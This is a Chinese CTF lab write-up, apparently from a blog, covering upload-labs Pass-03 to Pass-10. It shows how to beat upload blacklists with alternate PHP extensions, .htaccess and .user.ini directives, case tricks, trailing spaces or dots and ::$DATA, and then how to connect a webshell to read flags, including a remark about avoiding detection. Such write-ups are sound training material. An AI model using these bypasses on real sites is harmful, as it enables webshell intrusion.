SetHandler application/x-httpd-php-source</span><br><span class="line">    # Deny access to raw php sources by default</span><br><span class="line">    # To re-enable it&#x27;s recommended to enable access to the files</span><br><span class="line">    # only in specific virtual host or directory</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><div align="right"><a src="https://github.com/monstra-cms/monstra/issues/429">来自 GitHub</a></div></blockquote><p>从上方的正则表达式中可以看出，在 <code>php5 module for apache2(libapache2-mod-php5)</code> 中后缀名为 <code>.php</code>、<code>.php3</code>、<code>.php4</code>、<code>.php5</code>、<code>.pht</code>、<code>.phtml</code>、<code>.phps</code> 的文件都会被解析为 <code>php</code> 文件。</p><p>当然，这只是一个特殊版本的例子，事实上我们并不知道靶机网站是什么版本的。但是我们可以参考这个修改我们的木马文件后缀名为上述其一，大部分情况修改为 <code>php3</code> 即可。</p></li><li><p>直接修改备好的木马文件：</p><img src="https://bu.dusays.com/2022/05/09/6278b0337dbbe.webp" alt="" style="zoom:75%"></li><li><p>上传，成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b034494fc.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-2">夺旗</h3><ul><li><p>蚁剑添加</p><img src="https://bu.dusays.com/2022/05/09/6278b035a0bd6.webp" alt="" style="zoom:75%"><p>不难看出，第三关不再保留我们的文件名了，因此我不需要再对中文进行编码了。</p></li><li><p>既然已经进来了，就不急着夺旗，先看看他到底支持哪些 <code>php</code> 后缀名。访问下方文件 <code>/var/www/html/docker/docker-php.conf</code></p><img src="https://bu.dusays.com/2022/05/09/6278b0368b390.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/09/6278b037b16a0.webp" alt="" style="zoom:75%"><p>因此，只支持 <code>php</code>、<code>php3</code>、<code>phtml</code> 三种！（当然这仅代表我所使用的靶机仅支持这三种。）</p></li><li><p>满足了好奇心之后，便直接根目录夺旗吧！</p><img src="https://bu.dusays.com/2022/05/09/6278b038b01c1.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-04">Pass-04</h2><h3 id="启动靶机-11">启动靶机</h3><ul><li><p>熟悉的页面：</p><img src="https://bu.dusays.com/2022/05/09/6278b039b8f36.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-2">研究界面</h3><ul><li><p>直接上传木马文件，提示错误：此文件不允许上传！</p><img src="https://bu.dusays.com/2022/05/09/6278b03a9d262.webp" alt="" style="zoom:75%"></li><li><p>小白依然理直气壮看提示：</p><img src="https://bu.dusays.com/2022/05/09/6278b03bddbd7.webp" alt="" style="zoom:75%"><p>好家伙一口气把这么多后缀名都给拉黑了，因此第三关的方法就不适用了。</p></li><li><p>查看源码，可以发现和第三关一样，依旧屏蔽了大小写：</p><img src="https://bu.dusays.com/2022/05/09/6278b04438013.webp" alt="" style="zoom:75%"></li><li><p>根据上一关的思路，有没有可能让后缀名为 <code>.jpg</code> 、 <code>.png</code> 之类的图片文件或者其他文件也被解析为 <code>.php</code> 脚本呢？</p><p>可以使用 <code>.htaccess</code> ，即所谓的分布式配置文件，我们可以通过这个文件传输指令，将伪装成图片的木马文件解析成 <code>php</code> 脚本。值得注意的是，<code>.htaccess</code> 的作用域在文件所在目录及其所有子目录，而我们上传的所有文件都会在同一目录，此外该后缀名也不在黑名单中，因此完全可用！</p></li></ul><h3 id="突破限制-5">突破限制</h3><ul><li><p>要使用 <code>.htaccess</code> 文件实现攻击，首先我们需要了解部分指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .h-t-m</span><br><span class="line"># 将后缀名为 h-t-m 的文件解析为 php 脚本执行</span><br><span class="line"></span><br><span class="line">AddHandler php5-script .h-t-m</span><br><span class="line"># 将后缀名为 h-t-m 的文件用 php处理器 来处理，效果同上</span><br><span class="line"></span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line"># 将所有文件解析为 php 脚本执行</span><br></pre></td></tr></table></figure><p>此外，还有部分标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;h-t-m&quot;&gt;</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"># 文件匹配，引号中为正则表达式，匹配成功则执行内部指令</span><br><span class="line"></span><br><span class="line">&lt;IfModule 模块名&gt;</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"># 当指定模块开启时，内部指令执行</span><br></pre></td></tr></table></figure></li><li><p>上述两种标签都可以使用，文件匹配就匹配上传的木马文件名即可，而模块检测可以检测 <code>mime-module</code> 即可，这个模块执行 <code>MIME</code> 相关内容，在第二关我们知道要打开一个文件就要检测 <code>MIME</code> 然后匹配对应处理器，而这正适用于这里。推荐使用文件匹配（精确具体文件名）的方式，尽可能对网站的影响减到最小，<psw>避免入侵被发现</psw>。</p><p>使用文件匹配标签时，指令对象只会是我们所指定的对象，因此 <code>.htaccess</code> 内容可以如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;木马.h-t-m&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>我们将木马文件名修改为 <code>木马.h-t-m</code>，虽然这不是正确的后缀名，但是显然只要在黑名单之外的均可。</p></li><li><p>准备好两个文件，木马文件直接修改后缀名为 <code>.h-t-m</code> ，配置文件内输入上述指令且保证文件名为 <code>.htaccess</code> 即可。</p><img src="https://bu.dusays.com/2022/05/09/6278b03cb30ff.webp" alt="" style="zoom:75%"></li><li><p>上传至靶机，自然是成功了的：</p><img src="https://bu.dusays.com/2022/05/09/6278b03dca9cf.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-3">夺旗</h3><ul><li><p>蚁剑添加，然后成功进入</p><img src="https://bu.dusays.com/2022/05/09/6278b03eacb88.webp" alt="" style="zoom:75%"></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b03fc77d8.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-05">Pass-05</h2><h3 id="启动靶机-12">启动靶机</h3><ul><li><p>更改靶机环境，本关为后补，因此 Pass-6 和 Pass-07 其实是原环境的 Pass-05 和 Pass-06 ，请忽略截图可能带来的题号不匹配。</p><img src="https://bu.dusays.com/2022/05/09/6278b059aff98.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-3">研究界面</h3><ul><li><p>查看提示，看不懂~</p><img src="https://bu.dusays.com/2022/05/09/6278b05a91f47.webp" alt="" style="zoom:75%"></li><li><p>本关一开始我当作第十关解了，虽然确实很像，而且第十关的解法也适用于这几关，但是显然 Pass-05 应该有自己的漏洞。</p></li><li><p>仔细观察黑名单，会发现后面几关的黑名单都比这一关多了一个 <code>.ini</code> ，也就是说，这一关的漏洞应该与第四关类似的上传两个文件越过检查。<psw>可算是明白为啥要把这一关添加到这里了！</psw></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="comment"># 后面关卡的黑名单列表</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="突破限制-6">突破限制</h3><ul><li><p><code>php.ini</code> 是 <code>php</code> 的配置文件，<code>.user.ini</code> 中的字段也会被 <code>php</code> 视为配置文件来处理，从而导致 <code>php</code> 的文件解析漏洞。因此 <code>.ini</code> 实际上屏蔽的就是 <code>.user.ini</code> 文件，与上一关的 <code>.htaccess</code> 一样作为配置文件，而且 <code>.user.ini</code> 的用途更广。主要有这两条指令：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">520</span>.h-t-m <span class="comment">//在页面顶部加载520.h-t-m文件</span></span><br><span class="line">auto_append_file=<span class="number">520</span>.h-t-m  <span class="comment">//在页面底部加载520.h-t-m文件</span></span><br></pre></td></tr></table></figure><p>其实就是会将文件内容包含进 <code>php</code> 文件中再运行。而要达到这个目的，还需要三个前提条件：</p><ol><li>服务器脚本语言为<code>PHP</code></li><li>服务器使用CGI／FastCGI模式</li><li>上传目录下要有可执行的php文件</li></ol></li><li><p>现在应该就不难理解提示里的那句：上传目录存在 php 文件（readme.php）。也就是说，环境已经构建好，就等着传文件入侵了！</p></li><li><p>准备文件：创建 <code>.user.ini</code> 文件，内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">520</span>.h-t-m</span><br></pre></td></tr></table></figure><p>修改木马文件的文件名为 <code>520.h-t-m</code> ：</p><img src="https://bu.dusays.com/2022/05/11/627bd80672fe9.webp" alt="" style="zoom:75%"></li><li><p>上传二位，成功！</p><img src="https://bu.dusays.com/2022/05/11/627bd7f6c0384.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-4">夺旗</h3><ul><li><p>蚁剑连接，这里需要注意的是，<code>.uesr.ini</code> 的作用是将目标文件嵌入既有 <code>php</code> 文件中执行，因此我们连接时就得连接到既有的 <code>php</code> 文件中，这里就是提示中所说的 <code>readme.php</code> 文件。</p><img src="https://bu.dusays.com/2022/05/11/627bd7f904f2c.webp" alt="" style="zoom:75%"><p>很好，返回数据为空，行动失败！</p></li></ul><h3 id="问题探究">问题探究</h3><ul><li><p>返回数据为空意味着可以连接到文件但是文件无效，也就是一句话木马并没有加入到 <code>readme.php</code> 文件中。看来得检验一下环境！</p></li><li><p>通过其他关卡上传一句话木马其中包含语句 <code>phpinfo();</code> 也就是返回当前服务器得 <code>php</code> 版本等相关信息，可以看到结果如下：</p><img src="https://bu.dusays.com/2022/05/11/627bd7faaf6ec.webp" alt="" style="zoom:75%"><p>可以确定服务器是使用CGI／FastCGI模式，也就是理论上上述的三大前提都符合，木马不应该没有嵌入才对。</p></li><li><p>在 <code>php</code> 的手册中，有这么一句话</p><blockquote><p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件<em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用 .htaccess 文件有同样效果。</p><div align="right">——<a src="https://php.golaravel.com/configuration.file.per-user.html">php中文手册</a></div></blockquote></li><li><p>也就是说，版本太低了！</p><p>还是老老实实本地搭建靶机，虽然没有夺旗的乐趣，但毕竟自力更生才能走得长远。不过后续的关卡还是优先在 BUU 上完成。</p></li></ul><h3 id="再次突破">再次突破</h3><ul><li><p>本地部署并且上传完成后，蚁剑连接，完美！</p><img src="https://bu.dusays.com/2022/05/11/627bd7fc623d5.webp" alt="" style="zoom:75%"></li><li><p>于是我就成功入侵了自己的电脑，果然还是入侵别人的靶机有意思~</p></li></ul><h2 id="Pass-06">Pass-06</h2><h3 id="启动靶机-13">启动靶机</h3><ul><li><p>再次回到起点，一切还是那么熟悉</p><img src="https://bu.dusays.com/2022/05/09/6278b04115119.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-4">研究界面</h3><ul><li><p>先拿第四关的文件上传一遍，发现 <code>木马.h-t-m</code> 文件上传成功了，但是 <code>.htaccess</code> 文件被阻止了：</p><img src="https://bu.dusays.com/2022/05/09/6278b04266c0f.webp" alt="" style="zoom:75%"> <img src="https://bu.dusays.com/2022/05/09/6278b0434423b.webp" alt="" style="zoom:75%"><p>不难看出，难度升级，配置文件也不能用了。</p></li><li><p>那就再从源码下手，在前面关卡中我们有提到屏蔽大小写，而这一关的代码中，那一句代码却没了：</p><img src="https://bu.dusays.com/2022/05/09/6278b04529987.webp" alt="" style="zoom:75%"><p>这样的话，问题就简单了。</p></li></ul><h3 id="突破限制-7">突破限制</h3><ul><li><p>直接修改后缀名，改成大写的</p><img src="https://bu.dusays.com/2022/05/09/6278b0460a38d.webp" alt="" style="zoom:75%"></li><li><p>上传至靶机，成功！</p><img src="https://bu.dusays.com/2022/05/09/6278b046c7f44.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-5">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/09/6278b04805796.webp" alt="" style="zoom:75%"><p>有趣的是，这一关又是会对上传的文件自动编号的。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/09/6278b0491dd3e.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-07">Pass-07</h2><h3 id="启动靶机-14">启动靶机</h3><ul><li><p>再次回到起点，加油网安人</p><img src="https://bu.dusays.com/2022/05/09/6278b04a31b26.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-5">研究界面</h3><ul><li><p>上传第六关文件测试，果然失败了。</p><img src="https://bu.dusays.com/2022/05/09/6278b04b144d9.webp" alt="" style="zoom:75%"></li><li><p>查看提示，变化不大，但是却没有拉黑 <code>.htaccess</code> 文件。</p><img src="https://bu.dusays.com/2022/05/09/6278b04c4b51e.webp" alt="" style="zoom:75%"><p>不过可以认为这只是个 bug ，因为在源码中，可以看到 <code>.htaccess</code> 文件是在黑名单中的：</p><img src="https://bu.dusays.com/2022/05/09/6278b04d2f290.webp" alt="" style="zoom:75%"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>继续查看源码，与前面几关的源码对比，很容易能看出这次少了另一行代码：</p><img src="https://bu.dusays.com/2022/05/09/6278b04e011d0.webp" alt="" style="zoom:75%"><p>少的就是这行首尾去空的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="突破限制-8">突破限制</h3><ul><li><p>要利用这行缺失代码所带来的漏洞，我们先要知道他是干什么的。</p><p>正如注释所言，<code>trim()</code> 函数的作用就是去除字符串两端的空白字符。头部的空白字符很难对我们产生影响，但是尾部就涉及到了后缀名的内容。当后缀名为 <code>.php[]</code> 时（ <code>[]</code> 表示空白字符），他显然是不能与黑名单中的任一后缀匹配上的，由于是空白字符，因此大小写屏蔽也无影响。也就是说，如果我们的文件后缀名为 <code>.php[]</code> 时，入侵将不受任何影响<psw>？</psw></p></li><li><p>当然，如果想直接上传尾部带空格的文件也是不可能的，因为操作系统会自动忽略首位空白字符，因此，这里需要抓包！</p></li><li><p>在 <code>Burp Suite</code> 中打开靶机，直接上传备好的木马文件，抓包并在上传的文件名末尾加上一个空格。</p><img src="https://bu.dusays.com/2022/05/09/6278b04e011d0.webp" alt="" style="zoom:75%"></li><li><p><code>Forward</code> 之后就可以看到文件已经上传成功。</p><img src="https://bu.dusays.com/2022/05/09/6278b0507722c.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-6">夺旗</h3><ul><li><p>蚁剑连接，然后出问题。</p><img src="https://bu.dusays.com/2022/05/09/6278b052176c1.webp" alt="" style="zoom:75%"></li></ul><h3 id="问题探究-2">问题探究</h3><ul><li><p>然而无论怎么试，始终都无法成功连接，甚至直接通过浏览器访问文件，也显示 <code>NOT FOUND</code> 。通过其他关卡访问后台，可以发现我们上传的文件是存在的：</p><img src="https://bu.dusays.com/2022/05/09/6278b054cce14.webp" alt="" style="zoom:75%"><p>并且打开之后的内容也没有变：</p><img src="https://bu.dusays.com/2022/05/09/6278b053a87b1.webp" alt="" style="zoom:75%"></li><li><p>这里有个小细节，文件图标不一样，有效的脚本文件为第二个，而本关上传的文件为第一个，因此，我们所上传的这个文件并没有被解释为 <code>php</code> 脚本。</p><img src="https://bu.dusays.com/2022/05/09/6278b055a444e.webp" alt="" style="zoom:75%"></li><li><p>可能出问题的地方只有空格，我们在 URL 后加上 <code>%20</code> （代表空格）并在浏览器中访问，可以访问，而且在浏览器中显示了文本。</p><img src="https://bu.dusays.com/2022/05/09/6278b0566bcbb.webp" alt="" style="zoom:75%"></li><li><p><code>php</code> 指令在浏览器中不会显示，因此我们所上传的 <code>.php[]</code> 后缀的文件仅被解析为文本文件，而文本文件没有任何作用。</p></li><li><p>有一个前提被忽略了，后缀添加空格的漏洞<strong>仅适用于 Windows 系统</strong>。而靶机建立在 Linux 系统中，因此，这个漏洞在这不成立！由于 <a target="_blank" rel="noopener" href="https://buuoj.cn/">BUUCTF</a> 提供了 Windows 版本的靶机，因此这里直接换用，之后的关卡也将基于 Windows 版本（除了<a href="#Pass-19">Pass-19</a>）。</p></li></ul><h3 id="再次夺旗">再次夺旗</h3><ul><li><p>换了系统版本并再次上传文件后，蚁剑连接！</p><img src="https://bu.dusays.com/2022/05/09/6278b05747bb9.webp" alt="" style="zoom:75%"><p>这里需要注意的一点是，编码器不能使用 <code>default</code> 了，测试时貌似被 WAF （防火墙）给抓了，因此这里使用 <code>base64</code> 。</p></li><li><p>根目录夺旗，有一说一 Windows 的根目录还是熟悉一点，<psw>非常乱！</psw>，但是这文件名~</p><img src="https://bu.dusays.com/2022/05/09/6278b058771e5.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-08">Pass-08</h2><h3 id="启动靶机-15">启动靶机</h3><ul><li><p>再次回到开始，熟悉的界面。</p><img src="https://bu.dusays.com/2022/05/09/6278b00ea80cf.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-6">研究界面</h3><ul><li><p>直接看源码，依然是关键部分少了一句：</p><img src="https://bu.dusays.com/2022/05/11/627bd807c9465.webp" alt="" style="zoom:75%"><p>删除了这句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br></pre></td></tr></table></figure></li><li><p>该语句负责删除文件名末尾无效的点，也就是说，如果后缀名为 <code>.php.</code> 的话，将不会被黑名单命中，且由于 Windows 自动忽略末尾无效点，应脚本依然能够被正确执行！</p></li><li><p>值得注意的是由于后续语句都基于最后一个点所提取出来的后缀名做的操作，而该语句的删除也导致后缀名提取为空，即 <code>.php.</code> 中最后一个点后面所接的后缀名为空。因此，只要上传文件的文件名以点结尾，所有的后续操作都将无效。</p></li></ul><h3 id="突破限制-9">突破限制</h3><ul><li><p>在 <code>BurpSuite</code> 中打开靶机，上传文件抓包修改文件名，只需要在最后加上一个点即可：</p><img src="https://bu.dusays.com/2022/05/11/627bd80981451.webp" alt="" style="zoom:75%"></li><li><p><code>Forward</code> 之后，上传成功！</p><img src="https://bu.dusays.com/2022/05/11/627bd7e2bced4.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-7">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd7ec1db5c.webp" alt="" style="zoom:75%"><p>当然，末尾不要带点（就是因为 Windows 会把无效点舍去才会有这个漏洞），编码器也不要用默认的。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd7e2f2a82.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-09">Pass-09</h2><h3 id="启动靶机-16">启动靶机</h3><ul><li><p>继续继续，第九关了！</p><img src="https://bu.dusays.com/2022/05/11/627bd7e592a21.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究界面-7">研究界面</h3><ul><li><p>不多废话，直接看源码，根据前几关的经验，该轮到 <code>::$DATA</code> 了。源码中果然少了那句。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure><img src="https://bu.dusays.com/2022/05/11/627bd7ea4a317.webp" alt="" style="zoom:75%"></li><li><p>关于 <code>::$DATA</code> 的作用，在 Windows 系统中只会以 <code>::$DATA</code> 前的数据当作文件名。因此，如果文件名为 <code>h-t-m.php::$DATA</code> 则后缀名不会与黑名单匹配，但是系统也依然会正确执行！</p></li></ul><h3 id="突破限制-10">突破限制</h3><ul><li><p>在 <code>BurpSuite</code> 中打开靶机，上传文件抓包修改文件名，只需要在最后加上 <code>::$DATA</code> 即可：</p><img src="https://bu.dusays.com/2022/05/11/627bd7ef7b929.webp" alt="" style="zoom:75%"></li><li><p><code>Forward</code> 之后，上传成功！</p><img src="https://bu.dusays.com/2022/05/11/627bd7f1259bd.webp" alt="" style="zoom:75%"></li></ul><h3 id="夺旗-8">夺旗</h3><ul><li><p>蚁剑连接</p><img src="https://bu.dusays.com/2022/05/11/627bd7f21daae.webp" alt="" style="zoom:75%"><p>当然，<code>::$DATA</code> 是要被忽略的，所以连接时不要加上 <code>::$DATA</code> 。</p></li><li><p>根目录夺旗</p><img src="https://bu.dusays.com/2022/05/11/627bd7f4d5172.webp" alt="" style="zoom:75%"></li></ul><h2 id="Pass-10">Pass-10</h2><h3 id="启动靶机-17">启动靶机</h3><ul><li><p>再次回到这里</p><img src="https://bu.dusays.com/2022/05/09/6278b00ea80cf.webp" alt="" style="zoom:75%"></li></ul><h3 id="研究页面-4">研究页面</h3><ul><li><p>直接查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span 